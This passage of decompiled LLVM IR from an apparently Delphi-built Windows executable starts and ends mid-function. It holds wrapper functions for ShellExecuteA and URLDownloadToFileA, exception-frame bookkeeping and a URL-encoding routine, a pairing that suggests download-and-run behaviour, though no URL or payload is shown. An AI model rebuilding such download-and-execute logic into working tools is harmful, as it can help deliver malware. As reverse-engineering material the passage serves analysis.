  %199 = trunc i32 %196 to i8, !insn.addr !368
  %200 = add i8 %198, %199, !insn.addr !368
  store i8 %200, i8* %197, align 1, !insn.addr !368
  %201 = load i32, i32* %eax, align 4
  %202 = inttoptr i32 %201 to i8*, !insn.addr !369
  %203 = load i8, i8* %202, align 1, !insn.addr !369
  %204 = trunc i32 %201 to i8, !insn.addr !369
  %205 = add i8 %203, %204, !insn.addr !369
  store i8 %205, i8* %202, align 1, !insn.addr !369
  %206 = load i32, i32* %eax, align 4
  %207 = inttoptr i32 %206 to i8*, !insn.addr !370
  %208 = load i8, i8* %207, align 1, !insn.addr !370
  %209 = trunc i32 %206 to i8, !insn.addr !370
  %210 = add i8 %208, %209, !insn.addr !370
  store i8 %210, i8* %207, align 1, !insn.addr !370
  %211 = load i32, i32* %eax, align 4
  %212 = inttoptr i32 %211 to i8*, !insn.addr !371
  %213 = load i8, i8* %212, align 1, !insn.addr !371
  %214 = trunc i32 %211 to i8, !insn.addr !371
  %215 = add i8 %213, %214, !insn.addr !371
  store i8 %215, i8* %212, align 1, !insn.addr !371
  %216 = load i32, i32* %eax, align 4
  %217 = inttoptr i32 %216 to i8*, !insn.addr !372
  %218 = load i8, i8* %217, align 1, !insn.addr !372
  %219 = trunc i32 %216 to i8, !insn.addr !372
  %220 = add i8 %218, %219, !insn.addr !372
  store i8 %220, i8* %217, align 1, !insn.addr !372
  %221 = load i32, i32* %eax, align 4
  %222 = inttoptr i32 %221 to i8*, !insn.addr !373
  %223 = load i8, i8* %222, align 1, !insn.addr !373
  %224 = trunc i32 %221 to i8, !insn.addr !373
  %225 = add i8 %223, %224, !insn.addr !373
  store i8 %225, i8* %222, align 1, !insn.addr !373
  %226 = load i32, i32* %eax, align 4
  %227 = inttoptr i32 %226 to i8*, !insn.addr !374
  %228 = load i8, i8* %227, align 1, !insn.addr !374
  %229 = trunc i32 %226 to i8, !insn.addr !374
  %230 = add i8 %228, %229, !insn.addr !374
  store i8 %230, i8* %227, align 1, !insn.addr !374
  %231 = load i32, i32* %eax, align 4
  %232 = inttoptr i32 %231 to i8*, !insn.addr !375
  %233 = load i8, i8* %232, align 1, !insn.addr !375
  %234 = trunc i32 %231 to i8, !insn.addr !375
  %235 = add i8 %233, %234, !insn.addr !375
  store i8 %235, i8* %232, align 1, !insn.addr !375
  %236 = load i32, i32* %eax, align 4
  %237 = inttoptr i32 %236 to i8*, !insn.addr !376
  %238 = load i8, i8* %237, align 1, !insn.addr !376
  %239 = trunc i32 %236 to i8, !insn.addr !376
  %240 = add i8 %238, %239, !insn.addr !376
  store i8 %240, i8* %237, align 1, !insn.addr !376
  store i32* %131, i32** %.pre-phi4.reg2mem, !insn.addr !376
  store i32* %126, i32** %.pre-phi.reg2mem, !insn.addr !376
  store i32 %125, i32* %ebx.1.reg2mem, !insn.addr !376
  br label %dec_label_pc_404891, !insn.addr !376

dec_label_pc_404891:                              ; preds = %dec_label_pc_404810.dec_label_pc_404891_crit_edge, %dec_label_pc_40481b
  %ebx.1.reload = load i32, i32* %ebx.1.reg2mem
  %.pre-phi.reload = load i32*, i32** %.pre-phi.reg2mem
  %.pre-phi4.reload = load i32*, i32** %.pre-phi4.reg2mem
  %241 = load i32, i32* %eax, align 4
  %242 = inttoptr i32 %241 to i8*, !insn.addr !377
  %243 = load i8, i8* %242, align 1, !insn.addr !377
  %244 = trunc i32 %241 to i8, !insn.addr !377
  %245 = add i8 %243, %244, !insn.addr !377
  store i8 %245, i8* %242, align 1, !insn.addr !377
  %246 = load i32, i32* %eax, align 4
  %247 = inttoptr i32 %246 to i8*, !insn.addr !378
  %248 = load i8, i8* %247, align 1, !insn.addr !378
  %249 = trunc i32 %246 to i8, !insn.addr !378
  %250 = add i8 %248, %249, !insn.addr !378
  store i8 %250, i8* %247, align 1, !insn.addr !378
  %251 = load i32, i32* %eax, align 4
  %252 = inttoptr i32 %251 to i8*, !insn.addr !379
  %253 = load i8, i8* %252, align 1, !insn.addr !379
  %254 = trunc i32 %251 to i8, !insn.addr !379
  %255 = add i8 %253, %254, !insn.addr !379
  store i8 %255, i8* %252, align 1, !insn.addr !379
  %256 = add i32 %ebx.1.reload, 66, !insn.addr !380
  %257 = inttoptr i32 %256 to i8*, !insn.addr !380
  %258 = load i8, i8* %257, align 1, !insn.addr !380
  %259 = load i32, i32* %eax, align 4, !insn.addr !380
  %260 = trunc i32 %259 to i8, !insn.addr !380
  %261 = add i8 %258, %260, !insn.addr !380
  store i8 %261, i8* %257, align 1, !insn.addr !380
  %262 = add i32 %ebx.1.reload, 1, !insn.addr !381
  %263 = load i32, i32* %.pre-phi.reload, align 4, !insn.addr !324
  %264 = load i32, i32* %edi, align 8, !insn.addr !382
  store i32 %264, i32* %.pre-phi.reload, align 4, !insn.addr !382
  %265 = load i32, i32* %eax, align 4, !insn.addr !325
  store i32 %265, i32* %.pre-phi4.reload, align 4, !insn.addr !325
  %266 = add i32 %265, 113, !insn.addr !383
  %267 = inttoptr i32 %266 to i64 addrspace(258)*, !insn.addr !383
  %268 = load i64, i64 addrspace(258)* %267, align 4, !insn.addr !383
  %269 = call i32 @__asm_bound(i64 %268), !insn.addr !383
  %270 = trunc i32 %263 to i16, !insn.addr !384
  %271 = call i32 @__asm_insd(i16 %270), !insn.addr !384
  %272 = load i32, i32* %edi, align 8, !insn.addr !384
  %273 = inttoptr i32 %272 to i32*, !insn.addr !384
  store i32 %271, i32* %273, align 4, !insn.addr !384
  %274 = udiv i32 %263, 256, !insn.addr !385
  %275 = trunc i32 %274 to i8, !insn.addr !385
  %276 = bitcast i32* %edi to i8*
  %277 = load i8, i8* %276, align 8, !insn.addr !385
  %278 = xor i8 %277, %275, !insn.addr !385
  %279 = zext i8 %278 to i32, !insn.addr !385
  %280 = mul i32 %279, 256, !insn.addr !385
  %281 = and i32 %263, -65281, !insn.addr !385
  %282 = or i32 %280, %281, !insn.addr !385
  %283 = load i32, i32* %eax, align 4
  %284 = xor i32 %283, 61, !insn.addr !386
  store i32 %284, i32* %eax, align 4, !insn.addr !386
  %285 = inttoptr i32 %284 to i8*, !insn.addr !387
  %286 = load i8, i8* %285, align 1, !insn.addr !387
  %287 = trunc i32 %284 to i8, !insn.addr !387
  %288 = add i8 %286, %287, !insn.addr !387
  store i8 %288, i8* %285, align 1, !insn.addr !387
  %289 = load i32, i32* %eax, align 4
  %290 = inttoptr i32 %289 to i8*, !insn.addr !388
  %291 = load i8, i8* %290, align 1, !insn.addr !388
  %292 = trunc i32 %289 to i8, !insn.addr !388
  %293 = add i8 %291, %292, !insn.addr !388
  store i8 %293, i8* %290, align 1, !insn.addr !388
  %294 = load i32, i32* %eax, align 4
  %295 = inttoptr i32 %294 to i8*, !insn.addr !389
  %296 = load i8, i8* %295, align 1, !insn.addr !389
  %297 = trunc i32 %294 to i8, !insn.addr !389
  %298 = add i8 %296, %297, !insn.addr !389
  store i8 %298, i8* %295, align 1, !insn.addr !389
  %299 = load i32, i32* %eax, align 4
  %300 = inttoptr i32 %299 to i8*, !insn.addr !390
  %301 = load i8, i8* %300, align 1, !insn.addr !390
  %302 = trunc i32 %299 to i8, !insn.addr !390
  %303 = add i8 %301, %302, !insn.addr !390
  store i8 %303, i8* %300, align 1, !insn.addr !390
  %304 = load i32, i32* %eax, align 4
  %305 = inttoptr i32 %304 to i8*, !insn.addr !391
  %306 = load i8, i8* %305, align 1, !insn.addr !391
  %307 = trunc i32 %304 to i8, !insn.addr !391
  %308 = add i8 %306, %307, !insn.addr !391
  store i8 %308, i8* %305, align 1, !insn.addr !391
  %309 = load i32, i32* %eax, align 4
  %310 = inttoptr i32 %309 to i8*, !insn.addr !392
  %311 = load i8, i8* %310, align 1, !insn.addr !392
  %312 = trunc i32 %309 to i8, !insn.addr !392
  %313 = add i8 %311, %312, !insn.addr !392
  store i8 %313, i8* %310, align 1, !insn.addr !392
  %314 = load i32, i32* %eax, align 4
  %315 = inttoptr i32 %314 to i8*, !insn.addr !393
  %316 = load i8, i8* %315, align 1, !insn.addr !393
  %317 = trunc i32 %314 to i8, !insn.addr !393
  %318 = add i8 %316, %317, !insn.addr !393
  store i8 %318, i8* %315, align 1, !insn.addr !393
  %319 = load i32, i32* %eax, align 4
  %320 = inttoptr i32 %319 to i8*, !insn.addr !394
  %321 = load i8, i8* %320, align 1, !insn.addr !394
  %322 = trunc i32 %319 to i8, !insn.addr !394
  %323 = add i8 %321, %322, !insn.addr !394
  store i8 %323, i8* %320, align 1, !insn.addr !394
  %324 = load i32, i32* %eax, align 4
  %325 = inttoptr i32 %324 to i8*, !insn.addr !395
  %326 = load i8, i8* %325, align 1, !insn.addr !395
  %327 = trunc i32 %324 to i8, !insn.addr !395
  %328 = add i8 %326, %327, !insn.addr !395
  store i8 %328, i8* %325, align 1, !insn.addr !395
  %329 = load i32, i32* %eax, align 4
  %330 = inttoptr i32 %329 to i8*, !insn.addr !396
  %331 = load i8, i8* %330, align 1, !insn.addr !396
  %332 = trunc i32 %329 to i8, !insn.addr !396
  %333 = add i8 %331, %332, !insn.addr !396
  store i8 %333, i8* %330, align 1, !insn.addr !396
  %334 = load i32, i32* %eax, align 4
  %335 = inttoptr i32 %334 to i8*, !insn.addr !397
  %336 = load i8, i8* %335, align 1, !insn.addr !397
  %337 = trunc i32 %334 to i8, !insn.addr !397
  %338 = add i8 %336, %337, !insn.addr !397
  store i8 %338, i8* %335, align 1, !insn.addr !397
  %339 = load i32, i32* %eax, align 4
  %340 = inttoptr i32 %339 to i8*, !insn.addr !398
  %341 = load i8, i8* %340, align 1, !insn.addr !398
  %342 = trunc i32 %339 to i8, !insn.addr !398
  %343 = add i8 %341, %342, !insn.addr !398
  store i8 %343, i8* %340, align 1, !insn.addr !398
  %344 = load i32, i32* %eax, align 4
  %345 = inttoptr i32 %344 to i8*, !insn.addr !399
  %346 = load i8, i8* %345, align 1, !insn.addr !399
  %347 = trunc i32 %344 to i8, !insn.addr !399
  %348 = add i8 %346, %347, !insn.addr !399
  store i8 %348, i8* %345, align 1, !insn.addr !399
  %349 = load i32, i32* %eax, align 4
  %350 = inttoptr i32 %349 to i8*, !insn.addr !400
  %351 = load i8, i8* %350, align 1, !insn.addr !400
  %352 = trunc i32 %349 to i8, !insn.addr !400
  %353 = add i8 %351, %352, !insn.addr !400
  store i8 %353, i8* %350, align 1, !insn.addr !400
  %354 = load i32, i32* %eax, align 4
  %355 = inttoptr i32 %354 to i8*, !insn.addr !401
  %356 = load i8, i8* %355, align 1, !insn.addr !401
  %357 = trunc i32 %354 to i8, !insn.addr !401
  %358 = add i8 %356, %357, !insn.addr !401
  store i8 %358, i8* %355, align 1, !insn.addr !401
  %359 = load i32, i32* %eax, align 4
  %360 = inttoptr i32 %359 to i8*, !insn.addr !402
  %361 = load i8, i8* %360, align 1, !insn.addr !402
  %362 = trunc i32 %359 to i8, !insn.addr !402
  %363 = add i8 %361, %362, !insn.addr !402
  store i8 %363, i8* %360, align 1, !insn.addr !402
  %364 = load i32, i32* %eax, align 4
  %365 = inttoptr i32 %364 to i8*, !insn.addr !403
  %366 = load i8, i8* %365, align 1, !insn.addr !403
  %367 = trunc i32 %364 to i8, !insn.addr !403
  %368 = add i8 %366, %367, !insn.addr !403
  store i8 %368, i8* %365, align 1, !insn.addr !403
  %369 = load i32, i32* %eax, align 4
  %370 = inttoptr i32 %369 to i8*, !insn.addr !404
  %371 = load i8, i8* %370, align 1, !insn.addr !404
  %372 = trunc i32 %369 to i8, !insn.addr !404
  %373 = add i8 %371, %372, !insn.addr !404
  store i8 %373, i8* %370, align 1, !insn.addr !404
  %374 = load i32, i32* %eax, align 4
  %375 = inttoptr i32 %374 to i8*, !insn.addr !405
  %376 = load i8, i8* %375, align 1, !insn.addr !405
  %377 = trunc i32 %374 to i8, !insn.addr !405
  %378 = add i8 %376, %377, !insn.addr !405
  store i8 %378, i8* %375, align 1, !insn.addr !405
  %379 = load i32, i32* %eax, align 4
  %380 = inttoptr i32 %379 to i8*, !insn.addr !406
  %381 = load i8, i8* %380, align 1, !insn.addr !406
  %382 = trunc i32 %379 to i8, !insn.addr !406
  %383 = add i8 %381, %382, !insn.addr !406
  store i8 %383, i8* %380, align 1, !insn.addr !406
  %384 = load i32, i32* %eax, align 4
  %385 = inttoptr i32 %384 to i8*, !insn.addr !407
  %386 = load i8, i8* %385, align 1, !insn.addr !407
  %387 = trunc i32 %384 to i8, !insn.addr !407
  %388 = add i8 %386, %387, !insn.addr !407
  store i8 %388, i8* %385, align 1, !insn.addr !407
  %389 = load i32, i32* %eax, align 4
  %390 = inttoptr i32 %389 to i8*, !insn.addr !408
  %391 = load i8, i8* %390, align 1, !insn.addr !408
  %392 = trunc i32 %389 to i8, !insn.addr !408
  %393 = add i8 %391, %392, !insn.addr !408
  store i8 %393, i8* %390, align 1, !insn.addr !408
  %394 = load i32, i32* %eax, align 4
  %395 = inttoptr i32 %394 to i8*, !insn.addr !409
  %396 = load i8, i8* %395, align 1, !insn.addr !409
  %397 = trunc i32 %394 to i8, !insn.addr !409
  %398 = add i8 %396, %397, !insn.addr !409
  store i8 %398, i8* %395, align 1, !insn.addr !409
  %399 = inttoptr i32 %282 to i8*, !insn.addr !410
  %400 = load i8, i8* %399, align 1, !insn.addr !410
  %401 = udiv i32 %262, 256, !insn.addr !410
  %402 = trunc i32 %401 to i8, !insn.addr !410
  %403 = add i8 %400, %402, !insn.addr !410
  store i8 %403, i8* %399, align 1, !insn.addr !410
  %404 = load i32, i32* %eax, align 4
  %405 = xor i32 %404, 52, !insn.addr !411
  %406 = bitcast i32* %edi to i64*
  %407 = load i64, i64* %406, align 8, !insn.addr !412
  %408 = call i32 @__asm_bound(i64 %407), !insn.addr !412
  %409 = inttoptr i32 %405 to i8*, !insn.addr !413
  %410 = load i8, i8* %409, align 1, !insn.addr !413
  %411 = trunc i32 %405 to i8, !insn.addr !413
  %factor = mul i8 %411, 25
  %412 = add i8 %factor, %410, !insn.addr !414
  store i8 %412, i8* %409, align 1, !insn.addr !414
  ret i32 %405, !insn.addr !414
}

define i32 @function_404a05() local_unnamed_addr {
dec_label_pc_404a05:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !415
  ret i32 %0, !insn.addr !415
}

define i32 @function_404a0a() local_unnamed_addr {
dec_label_pc_404a0a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !416
}

define i32 @function_404a0c(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a0c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !417
}

define i32 @function_404a10() local_unnamed_addr {
dec_label_pc_404a10:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40968c, align 4, !insn.addr !418
  %2 = add i32 %1, -1, !insn.addr !418
  store i32 %2, i32* @global_var_40968c, align 4, !insn.addr !418
  ret i32 %0, !insn.addr !419
}

define i32* @function_404a18(i32* %hwnd, i8* %lpOperation, i8* %lpFile, i8* %lpParameters, i8* %lpDirectory, i32 %nShowCmd) local_unnamed_addr {
dec_label_pc_404a18:
  %0 = call i32* @ShellExecuteA(i32* %hwnd, i8* %lpOperation, i8* %lpFile, i8* %lpParameters, i8* %lpDirectory, i32 %nShowCmd), !insn.addr !420
  ret i32* %0, !insn.addr !420
}

define i32 @function_404a20() local_unnamed_addr {
dec_label_pc_404a20:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !421
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !421
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !421
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !422
  %2 = load i32, i32* @global_var_409690, align 4, !insn.addr !423
  %3 = add i32 %2, 1, !insn.addr !423
  store i32 %3, i32* @global_var_409690, align 4, !insn.addr !423
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !424
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !425
  ret i32 0, !insn.addr !426
}

define i32 @function_404a45() local_unnamed_addr {
dec_label_pc_404a45:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !427
  ret i32 %0, !insn.addr !427
}

define i32 @function_404a4a() local_unnamed_addr {
dec_label_pc_404a4a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !428
}

define i32 @function_404a4c(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a4c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !429
}

define i32 @function_404a50() local_unnamed_addr {
dec_label_pc_404a50:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409690, align 4, !insn.addr !430
  %2 = add i32 %1, -1, !insn.addr !430
  store i32 %2, i32* @global_var_409690, align 4, !insn.addr !430
  ret i32 %0, !insn.addr !431
}

define i32 @function_404a58() local_unnamed_addr {
dec_label_pc_404a58:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !432
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !432
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !432
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !433
  %2 = load i32, i32* @global_var_409694, align 4, !insn.addr !434
  %3 = add i32 %2, 1, !insn.addr !434
  store i32 %3, i32* @global_var_409694, align 4, !insn.addr !434
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !435
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !436
  ret i32 0, !insn.addr !437
}

define i32 @function_404a7d() local_unnamed_addr {
dec_label_pc_404a7d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !438
  ret i32 %0, !insn.addr !438
}

define i32 @function_404a82() local_unnamed_addr {
dec_label_pc_404a82:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !439
}

define i32 @function_404a84(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a84:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !440
}

define i32 @function_404a88() local_unnamed_addr {
dec_label_pc_404a88:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409694, align 4, !insn.addr !441
  %2 = add i32 %1, -1, !insn.addr !441
  store i32 %2, i32* @global_var_409694, align 4, !insn.addr !441
  ret i32 %0, !insn.addr !442
}

define i32 @function_404a90() local_unnamed_addr {
dec_label_pc_404a90:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !443
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !443
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !443
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !444
  %2 = load i32, i32* @global_var_409698, align 4, !insn.addr !445
  %3 = add i32 %2, 1, !insn.addr !445
  store i32 %3, i32* @global_var_409698, align 4, !insn.addr !445
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !446
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !447
  ret i32 0, !insn.addr !448
}

define i32 @function_404ab5() local_unnamed_addr {
dec_label_pc_404ab5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !449
  ret i32 %0, !insn.addr !449
}

define i32 @function_404aba() local_unnamed_addr {
dec_label_pc_404aba:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !450
}

define i32 @function_404abc(i32 %arg1) local_unnamed_addr {
dec_label_pc_404abc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !451
}

define i32 @function_404ac0() local_unnamed_addr {
dec_label_pc_404ac0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409698, align 4, !insn.addr !452
  %2 = add i32 %1, -1, !insn.addr !452
  store i32 %2, i32* @global_var_409698, align 4, !insn.addr !452
  ret i32 %0, !insn.addr !453
}

define i32 @function_404ac8(i32* %arg1, i8* %arg2, i8* %arg3, i32 %arg4, i32* %arg5) local_unnamed_addr {
dec_label_pc_404ac8:
  %0 = call i32 @URLDownloadToFileA(i32* %arg1, i8* %arg2, i8* %arg3, i32 %arg4, i32* %arg5), !insn.addr !454
  ret i32 %0, !insn.addr !454
}

define i32 @function_404ad0() local_unnamed_addr {
dec_label_pc_404ad0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !455
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !455
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !455
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !456
  %2 = load i32, i32* @global_var_40969c, align 4, !insn.addr !457
  %3 = add i32 %2, 1, !insn.addr !457
  store i32 %3, i32* @global_var_40969c, align 4, !insn.addr !457
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !458
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !459
  ret i32 0, !insn.addr !460
}

define i32 @function_404af5() local_unnamed_addr {
dec_label_pc_404af5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !461
  ret i32 %0, !insn.addr !461
}

define i32 @function_404afa() local_unnamed_addr {
dec_label_pc_404afa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !462
}

define i32 @function_404afc(i32 %arg1) local_unnamed_addr {
dec_label_pc_404afc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !463
}

define i32 @function_404b00() local_unnamed_addr {
dec_label_pc_404b00:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40969c, align 4, !insn.addr !464
  %2 = add i32 %1, -1, !insn.addr !464
  store i32 %2, i32* @global_var_40969c, align 4, !insn.addr !464
  ret i32 %0, !insn.addr !465
}

define i32 @function_404b08() local_unnamed_addr {
dec_label_pc_404b08:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8, !insn.addr !466
  %2 = icmp ult i8 %1, 10
  %3 = and i32 %0, 255
  br i1 %2, label %dec_label_pc_404b0c, label %dec_label_pc_404b15, !insn.addr !467

dec_label_pc_404b0c:                              ; preds = %dec_label_pc_404b08
  %4 = add nuw nsw i32 %3, 48, !insn.addr !468
  ret i32 %4, !insn.addr !469

dec_label_pc_404b15:                              ; preds = %dec_label_pc_404b08
  %5 = add nuw nsw i32 %3, 55, !insn.addr !470
  ret i32 %5, !insn.addr !471
}

define i32 @function_404b20() local_unnamed_addr {
dec_label_pc_404b20:
  %esp.2.reg2mem = alloca i32, !insn.addr !472
  %esp.1.reg2mem = alloca i32, !insn.addr !472
  %cf.0.reg2mem = alloca i1, !insn.addr !472
  %esi.0.reg2mem = alloca i32, !insn.addr !472
  %esp.0.reg2mem = alloca i32, !insn.addr !472
  %ebx.0.reg2mem = alloca i32, !insn.addr !472
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !473
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !474
  store i32 %2, i32* %stack_var_-52, align 4, !insn.addr !474
  %3 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !474
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !475
  %4 = call i32 @"@LStrClr"(), !insn.addr !476
  %5 = call i32 @function_4034c8(), !insn.addr !477
  %6 = icmp slt i32 %5, 1
  store i32 %3, i32* %esp.2.reg2mem, !insn.addr !478
  br i1 %6, label %dec_label_pc_404c21, label %dec_label_pc_404b6d.preheader, !insn.addr !478

dec_label_pc_404b6d.preheader:                    ; preds = %dec_label_pc_404b20
  %7 = add i32 %0, -1, !insn.addr !479
  store i32 1, i32* %ebx.0.reg2mem
  store i32 %3, i32* %esp.0.reg2mem
  store i32 %5, i32* %esi.0.reg2mem
  br label %dec_label_pc_404b6d

dec_label_pc_404b6d:                              ; preds = %dec_label_pc_404b6d.preheader, %dec_label_pc_404c19
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %8 = add i32 %7, %ebx.0.reload, !insn.addr !479
  %9 = inttoptr i32 %8 to i8*, !insn.addr !479
  %10 = load i8, i8* %9, align 1, !insn.addr !479
  %11 = icmp eq i8 %10, 32, !insn.addr !479
  %12 = icmp eq i1 %11, false, !insn.addr !480
  br i1 %12, label %dec_label_pc_404b88, label %dec_label_pc_404b77, !insn.addr !480

dec_label_pc_404b77:                              ; preds = %dec_label_pc_404b6d
  %13 = call i32 @"@LStrCat"(), !insn.addr !481
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !482
  br label %dec_label_pc_404c19, !insn.addr !482

dec_label_pc_404b88:                              ; preds = %dec_label_pc_404b6d
  %14 = icmp ult i8 %10, 32, !insn.addr !483
  br i1 %14, label %dec_label_pc_404bab, label %dec_label_pc_404b92, !insn.addr !484

dec_label_pc_404b92:                              ; preds = %dec_label_pc_404b88
  %15 = add i8 %10, -32, !insn.addr !485
  %16 = icmp ult i8 %15, 95, !insn.addr !486
  %17 = icmp ult i8 %15, 96
  store i1 %16, i1* %cf.0.reg2mem, !insn.addr !487
  br i1 %17, label %dec_label_pc_404b9f, label %dec_label_pc_404ba9, !insn.addr !487

dec_label_pc_404b9f:                              ; preds = %dec_label_pc_404b92
  %18 = load i32, i32* inttoptr (i32 4213856 to i32*), align 32, !insn.addr !488
  %19 = and i8 %15, 31
  %20 = zext i8 %19 to i32, !insn.addr !488
  %21 = shl i32 1, %20, !insn.addr !488
  %22 = and i32 %18, %21, !insn.addr !488
  %23 = icmp ne i32 %22, 0, !insn.addr !488
  store i1 %23, i1* %cf.0.reg2mem, !insn.addr !488
  br label %dec_label_pc_404ba9, !insn.addr !488

dec_label_pc_404ba9:                              ; preds = %dec_label_pc_404b92, %dec_label_pc_404b9f
  %cf.0.reload = load i1, i1* %cf.0.reg2mem
  %24 = icmp eq i1 %cf.0.reload, false, !insn.addr !489
  br i1 %24, label %dec_label_pc_404c00, label %dec_label_pc_404bab, !insn.addr !489

dec_label_pc_404bab:                              ; preds = %dec_label_pc_404ba9, %dec_label_pc_404b88
  %25 = and i8 %10, 15
  %26 = zext i8 %25 to i32, !insn.addr !490
  %27 = add i32 %esp.0.reload, -4, !insn.addr !491
  %28 = inttoptr i32 %27 to i32*, !insn.addr !491
  store i32 %26, i32* %28, align 4, !insn.addr !491
  %29 = add i32 %esp.0.reload, -8, !insn.addr !492
  %30 = inttoptr i32 %29 to i32*, !insn.addr !492
  store i32 ptrtoint (i32* @global_var_404c74 to i32), i32* %30, align 4, !insn.addr !492
  %31 = call i32 @function_404b08(), !insn.addr !493
  %32 = call i32 @"@LStrFromChar"(), !insn.addr !494
  %33 = add i32 %esp.0.reload, -12, !insn.addr !495
  %34 = inttoptr i32 %33 to i32*, !insn.addr !495
  store i32 0, i32* %34, align 4, !insn.addr !495
  %35 = call i32 @function_404b08(), !insn.addr !496
  %36 = call i32 @"@LStrFromChar"(), !insn.addr !497
  %37 = add i32 %esp.0.reload, -16, !insn.addr !498
  %38 = inttoptr i32 %37 to i32*, !insn.addr !498
  store i32 0, i32* %38, align 4, !insn.addr !498
  %39 = call i32 @"@LStrCatN"(), !insn.addr !499
  store i32 %37, i32* %esp.1.reg2mem, !insn.addr !500
  br label %dec_label_pc_404c19, !insn.addr !500

dec_label_pc_404c00:                              ; preds = %dec_label_pc_404ba9
  %40 = call i32 @"@LStrFromChar"(), !insn.addr !501
  %41 = call i32 @"@LStrCat"(), !insn.addr !502
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !502
  br label %dec_label_pc_404c19, !insn.addr !502

dec_label_pc_404c19:                              ; preds = %dec_label_pc_404c00, %dec_label_pc_404bab, %dec_label_pc_404b77
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %42 = add i32 %ebx.0.reload, 1, !insn.addr !503
  %43 = add i32 %esi.0.reload, -1, !insn.addr !504
  %44 = icmp eq i32 %43, 0, !insn.addr !504
  %45 = icmp eq i1 %44, false, !insn.addr !505
  store i32 %42, i32* %ebx.0.reg2mem, !insn.addr !505
  store i32 %esp.1.reload, i32* %esp.0.reg2mem, !insn.addr !505
  store i32 %43, i32* %esi.0.reg2mem, !insn.addr !505
  store i32 %esp.1.reload, i32* %esp.2.reg2mem, !insn.addr !505
  br i1 %45, label %dec_label_pc_404b6d, label %dec_label_pc_404c21, !insn.addr !505

dec_label_pc_404c21:                              ; preds = %dec_label_pc_404c19, %dec_label_pc_404b20
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %46 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !506
  %47 = load i32, i32* %46, align 4, !insn.addr !506
  call void @__writefsdword(i32 0, i32 %47), !insn.addr !507
  %48 = add i32 %esp.2.reload, 8, !insn.addr !508
  %49 = inttoptr i32 %48 to i32*, !insn.addr !508
  store i32 4213835, i32* %49, align 4, !insn.addr !508
  %50 = call i32 @"@LStrArrayClr"(), !insn.addr !509
  %51 = call i32 @"@LStrClr"(), !insn.addr !510
  ret i32 %51, !insn.addr !511
}

define i32 @function_404c44() local_unnamed_addr {
dec_label_pc_404c44:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !512
  ret i32 %0, !insn.addr !512
}

define i32 @function_404c49() local_unnamed_addr {
dec_label_pc_404c49:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !513
}

define i32 @function_404c4b(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404c4b:
  %0 = call i32 @__decompiler_undefined_function_0()
